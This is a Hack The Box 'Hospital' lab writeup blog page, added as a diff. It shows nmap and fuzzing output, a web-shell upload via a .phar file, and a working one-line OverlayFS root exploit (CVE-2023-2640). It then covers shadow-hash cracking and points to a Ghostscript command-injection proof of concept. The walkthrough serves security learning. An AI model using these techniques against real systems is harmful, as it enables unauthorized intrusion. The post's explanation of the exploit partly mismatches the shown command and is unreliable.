@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Hospital | OUHBOY</title>
+<meta name="keywords" content="htb, Windows">
+<meta name="description" content="Hospital HacktheBox Writeup">
+<meta name="author" content="Malw0re">
+<link rel="canonical" href="http://localhost:1313/posts/htb/hospital/hospital-notes/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.5cfc680b1eeaeef9efbced92d46c2a9e876b72ee14fba85846afc4cff9e6e6f8.css" integrity="sha256-XPxoCx7q7vnvvO2S1Gwqnodrcu4U&#43;6hYRq/Ez/nm5vg=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/htb/hospital/hospital-notes/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="OUHBOY (Alt + H)">OUHBOY</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="tags">
+                    <span>tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="archives">
+                    <span>archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="🔍 (Alt &#43; /)" accesskey=/>
+                    <span>🔍</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      Hospital
+    </h1>
+    <div class="post-description">
+      Hospital HacktheBox Writeup
+    </div>
+    <div class="post-meta">&lt;span title=&#39;2023-11-20 11:30:03 &#43;0000 &#43;0000&#39;&gt;November 20, 2023&lt;/span&gt;&amp;nbsp;·&amp;nbsp;9 min&amp;nbsp;·&amp;nbsp;Malw0re
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#intro" aria-label="Intro">Intro</a></li>
+                <li>
+                    <a href="#initial-recon" aria-label="Initial Recon">Initial Recon</a></li>
+                <li>
+                    <a href="#web-enumeration" aria-label="Web Enumeration">Web Enumeration</a><ul>
+                        
+                <li>
+                    <a href="#fuzzing" aria-label="Fuzzing">Fuzzing</a></li></ul>
+                </li>
+                <li>
+                    <a href="#initial-access" aria-label="Initial Access.">Initial Access.</a><ul>
+                        
+                <li>
+                    <a href="#enumeration" aria-label="Enumeration.">Enumeration.</a></li></ul>
+                </li>
+                <li>
+                    <a href="#privesc" aria-label="Privesc">Privesc</a></li>
+                <li>
+                    <a href="#windows-foothold" aria-label="Windows Foothold.">Windows Foothold.</a></li>
+                <li>
+                    <a href="#enumerating-rpcclient" aria-label="Enumerating RPCCLIENT">Enumerating RPCCLIENT</a></li>
+                <li>
+                    <a href="#root-foothold" aria-label="ROOT Foothold">ROOT Foothold</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img loading="lazy" src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*O3TMa7eQF57fH7yJWkyRkg.png" alt=""  />
+</p>
+<h2 id="intro">Intro<a hidden class="anchor" aria-hidden="true" href="#intro">#</a></h2>
+<p>Hospital. It is a Medium Category Machine. It involves some File Upload Attack, Ghostscript Command Injection and some Windows Privesc</p>
+<h2 id="initial-recon">Initial Recon<a hidden class="anchor" aria-hidden="true" href="#initial-recon">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT     STATE SERVICE          REASON
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh              syn-ack ttl <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>53/tcp   open  domain           syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec     syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc            syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn      syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap             syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>443/tcp  open  https            syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds     syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5         syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>593/tcp  open  http-rpc-epmap   syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>1801/tcp open  msmq             syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>2103/tcp open  zephyr-clt       syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>2105/tcp open  eklogin          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>2107/tcp open  msmq-mgmt        syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>3268/tcp open  globalcatLDAP    syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server    syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>5985/tcp open  wsman            syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>6065/tcp open  winpharaoh       syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>6403/tcp open  boe-cachesvr     syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>6406/tcp open  boe-processsvr   syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>6407/tcp open  boe-resssvr1     syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>6409/tcp open  boe-resssvr3     syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>6617/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>6635/tcp open  mpls-udp         syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy       syn-ack ttl <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>9389/tcp open  adws             syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sun Feb 25 21:01:51 2024 -- 1 IP address (1 host up) scanned in 1537.10 seconds</span>
+</span></span><span style="display:flex;"><span>                                                                                                                    
+</span></span><span style="display:flex;"><span>❯ cat Script_TCP_10.10.11.241.nmap
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94SVN scan initiated Sun Feb 25 21:01:52 2024 as: /usr/bin/nmap -Pn -sCV -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,3268,3269,3389,5985,6065,6403,6406,6407,6409,6617,6635,8080,9389 --open -oN nmap/Script_TCP_10.10.11.241.nmap --system-dns --stats-every 2s 10.10.11.241</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.241
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.48s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE           VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>53/tcp   open  domain            Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec      Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-02-26 01:02:02Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-09-06T10:49:03
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-09-06T10:49:03
+</span></span><span style="display:flex;"><span>443/tcp  open  ssl/http          Apache httpd 2.4.56 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1t PHP/8.0.28<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost
+</span></span><span style="display:flex;"><span>| Not valid before: 2009-11-10T23:48:47
+</span></span><span style="display:flex;"><span>|_Not valid after:  2019-11-08T23:48:47
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1t PHP/8.0.28
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl?
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-09-06T10:49:03
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-09-06T10:49:03
+</span></span><span style="display:flex;"><span>1801/tcp open  msmq?
+</span></span><span style="display:flex;"><span>2103/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>2105/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>2107/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>3268/tcp open  ldap              Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-09-06T10:49:03
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-09-06T10:49:03
+</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl?
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-09-06T10:49:03
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-09-06T10:49:03
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server     Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC.hospital.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-02-24T17:09:39
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-08-25T17:09:39
+</span></span><span style="display:flex;"><span>| rdp-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   Target_Name: HOSPITAL
+</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: HOSPITAL
+</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: DC
+</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: hospital.htb
+</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: DC.hospital.htb
+</span></span><span style="display:flex;"><span>|   DNS_Tree_Name: hospital.htb
+</span></span><span style="display:flex;"><span>|   Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>|_  System_Time: 2024-02-26T01:03:21+00:00
+</span></span><span style="display:flex;"><span>5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>6065/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>6403/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>6406/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>6407/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>6409/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>6617/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>6635/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>8080/tcp open  http              Apache httpd 2.4.55 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-open-proxy: Proxy might be redirecting requests
+</span></span><span style="display:flex;"><span>| http-cookie-flags: 
+</span></span><span style="display:flex;"><span>|   /: 
+</span></span><span style="display:flex;"><span>|     PHPSESSID: 
+</span></span><span style="display:flex;"><span>|_      httponly flag not set
+</span></span><span style="display:flex;"><span>| http-title: Login
+</span></span><span style="display:flex;"><span>|_Requested resource was login.php
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.55 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>9389/tcp open  mc-nmf            .NET Message Framing
+</span></span><span style="display:flex;"><span>Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-02-26T01:03:19
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></code></pre></div><p>Following our nmap scans, first off we check out the websites on ports <code>8080</code> and <code>443</code>.</p>
+<h2 id="web-enumeration">Web Enumeration<a hidden class="anchor" aria-hidden="true" href="#web-enumeration">#</a></h2>
+<p>Loading out the websites on the respective ports, on port <code>443</code> we are met with a login site same case applies to port <code>8080</code></p>
+<p><img loading="lazy" src="https://imgur.com/mG8iUuG.png" alt="port 443"  />
+</p>
+<p><img loading="lazy" src="https://imgur.com/tG024km.png" alt="port 8080"  />
+</p>
+<h3 id="fuzzing">Fuzzing<a hidden class="anchor" aria-hidden="true" href="#fuzzing">#</a></h3>
+<p>The next step is fuzzing the websites for directories. Checking out port 8080 we identify a few directories open.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.hta                    <span style="color:#f92672">[</span>Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.php                    <span style="color:#f92672">[</span>Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.htaccess               <span style="color:#f92672">[</span>Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.hta.php                <span style="color:#f92672">[</span>Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">[</span>Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 307ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.htpasswd               <span style="color:#f92672">[</span>Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1429ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.htaccess.php           <span style="color:#f92672">[</span>Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3359ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.htpasswd.php           <span style="color:#f92672">[</span>Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 7432ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>config.php              <span style="color:#f92672">[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 200ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>css                     <span style="color:#f92672">[</span>Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 199ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>failed.php              <span style="color:#f92672">[</span>Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 201ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>fonts                   <span style="color:#f92672">[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 200ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>images                  <span style="color:#f92672">[</span>Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>index.php               <span style="color:#f92672">[</span>Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>index.php               <span style="color:#f92672">[</span>Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>js                      <span style="color:#f92672">[</span>Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 200ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>login.php               <span style="color:#f92672">[</span>Status: 200, Size: 5739, Words: 1551, Lines: 134, Duration: 203ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>logout.php              <span style="color:#f92672">[</span>Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 202ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>register.php            <span style="color:#f92672">[</span>Status: 200, Size: 5125, Words: 1349, Lines: 114, Duration: 208ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>server-status           <span style="color:#f92672">[</span>Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 206ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>success.php             <span style="color:#f92672">[</span>Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 306ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>upload.php              <span style="color:#f92672">[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 203ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>uploads                 <span style="color:#f92672">[</span>Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 199ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>vendor                  <span style="color:#f92672">[</span>Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>First thing was to test out if we could register an account because from our fuzz output we identify that the uploads directory redirects to somewhere.
+<img loading="lazy" src="https://imgur.com/sZNmuyx.png" alt=""  />
+</p>
+<p>After logging in we are redirected to a page where we can upload files on the webpage.
+<img loading="lazy" src="https://imgur.com/ySaSfRw.png" alt=""  />
+</p>
+<p>Look at this instantly we need to try out some file upload attacks and since we have the <a href="https://book.hacktricks.xyz/pentesting-web/file-upload?source=post_page-----791ad6dd24ed--------------------------------">resources</a> to do so. We see that we can that we can upload a <code>.phar</code> file instead of a php file which subsequently involves getting a shell through accessing the uploads file.</p>
+<p>From my research i opted to go with <a href="https://github.com/flozz/p0wny-shell">powny</a> a very basic, single-file, PHP shell. After changing the extension to <code>phar</code> extension, we get a successful upload response.
+From our fuzzing earlier we saw an <code>/uploads</code> which can basically access files that we&rsquo;ve uploaded, which triggers a shell on the box.</p>
+<p><img loading="lazy" src="https://imgur.com/Zc1hBoJ.png" alt=""  />
+</p>
+<h2 id="initial-access">Initial Access.<a hidden class="anchor" aria-hidden="true" href="#initial-access">#</a></h2>
+<p>Having landed on the box, the powny shell instance was super slow for me so i decided to work from my environment and spawn back an instance on my machine using <a href="https://github.com/calebstewart/pwncat">pwncat</a>. Where we get an active session.
+<img loading="lazy" src="https://imgur.com/1CxIELr.png" alt=""  />
+</p>
+<h3 id="enumeration">Enumeration.<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h3>
+<p>Running some enumeration using pwncat in built script we identify a few interesting bits of information, first of we have the systems version number.
+<img loading="lazy" src="https://imgur.com/ETUmbkq.png" alt=""  />
+</p>
+<p><img loading="lazy" src="https://imgur.com/JRWLY6J.png" alt=""  />
+</p>
+<p>A username called <code>drwilliams</code> trying to access his folder we are given permission denied as we are <code>www-data</code> and can&rsquo;t access content inside his folder due to insufficient permissions.</p>
+<p><img loading="lazy" src="https://imgur.com/kipG9XY.png" alt=""  />
+</p>
+<h2 id="privesc">Privesc<a hidden class="anchor" aria-hidden="true" href="#privesc">#</a></h2>
+<p>Checking for vulnerabilities pertaining the system version we land on <code>CVE-2023–2640</code> a vulnerability that affects the Ubuntu kernel’s OverlayFS module.</p>
+<p>First off we need to identify if our system is running overlay.</p>
+<p><img loading="lazy" src="https://imgur.com/v18baZ9.png" alt=""  />
+</p>
+<p>and we see its running overlay to exploit this there&rsquo;s a public <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">POC</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unshare -rm sh -c <span style="color:#e6db74">&#34;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*; python3 -c &#39;import os;os.setuid(0);os.system(\&#34;/bin/bash\&#34;)&#39;&#34;</span>
+</span></span></code></pre></div><p>which when executed gives us some higher privileges on the account, so basically what the bash script does is exploits the vulnerabilities CVE-2023-2640 and CVE-2023-3262 on a Ubuntu system to gain unauthorized root access. The script creates directories, copies specific Python3-related files with added capabilities, and mounts an overlay filesystem using these directories. This overlay allows the script to create a merged view of the filesystem, facilitating privilege escalation. By executing a modified Python3 script within this overlay, the user ID is set to root, and the script copies and elevates the system Bash binary, allowing execution with elevated privileges. The script concludes by cleaning up the directories and copied binaries. Notably, such activities are malicious, potentially illegal, and underscore the importance of understanding overlay filesystems, capability exploitation, and security vulnerabilities for defending against unauthorized access and maintaining system integrity.</p>
+<p>Running the <code>POC</code> we get some root access.
+<img loading="lazy" src="https://imgur.com/QnESbaR.png" alt=""  />
+</p>
+<p>Now having some privesc done,we can read the shadow file to see if we can extract and crack some exposed passwords saved on the system and luckyily we have a stored hash that we can crack and get <code>drwilliams</code>&rsquo;s hash.Cracking the hash we get the password.</p>
+<p><img loading="lazy" src="https://imgur.com/Aa2jFb3l.png" alt=""  />
+</p>
+<p>which when trying out at port 443 of the website, we get access to the mail portal and checking the email we get an interesting email sent to <code>drwilliams</code> concerning a vulnerability on ghostscript. The exploitation can occur upon opening a PS or EPS file and can allow code execution caused by Ghostscript mishandling permission validation for pipe devices <a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">poc</a></p>
+<p><img loading="lazy" src="https://imgur.com/FLksOng.png" alt=""  />
+</p>
